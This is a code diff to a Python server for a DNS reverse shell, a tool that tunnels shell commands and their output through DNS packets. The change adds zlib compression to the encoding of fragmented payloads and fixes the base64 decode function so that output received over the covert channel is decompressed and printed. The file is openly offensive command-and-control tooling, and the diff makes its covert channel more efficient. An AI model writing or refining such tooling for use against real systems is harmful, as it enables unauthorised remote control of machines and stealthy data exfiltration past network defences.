@@ -5,6 +5,7 @@ from urllib import request
 
 import threading
 import argparse
+import zlib
 
 parser = argparse.ArgumentParser(description="DNS Reverse Shell Server")
 parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
@@ -32,12 +33,6 @@ FRAG_LEN = 70 - len(DOMAIN)
 recv = b""  # Buffer of received data to process
 queue = []  # List of commands to run
 buf = []  # Break commands to send into smaller fragmented pieces
-
-
-# Decode base64
-def decode(data: bytes) -> bytes:
-    data = b64decode(recv)
-    return data
 
 
 def reply(pkt, data=False) -> None:
@@ -71,9 +66,17 @@ def reply(pkt, data=False) -> None:
 # Encodes into base64 and fragments data into smaller pieces
 def encode(data: bytes) -> list:
     data = data.strip()
+    data = zlib.compress(data)
     e_data = b64encode(data).decode()
     frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
     return frag_e_data
+
+
+# Decode base64
+def decode(data: bytes) -> str:
+    data = b64decode(data)
+    data = zlib.decompress(data)
+    return data.decode()
 
 
 # Handle packets that come in
@@ -92,7 +95,7 @@ def pkt_callback(pkt) -> None:
         # Check if last packet
         if pkt[DNS].z == 1:
             try:
-                print(decode(recv).decode())
+                print(decode(recv))
             except:
                 # UDP may lose data, oh wells...
                 print("Data got corrupted!")
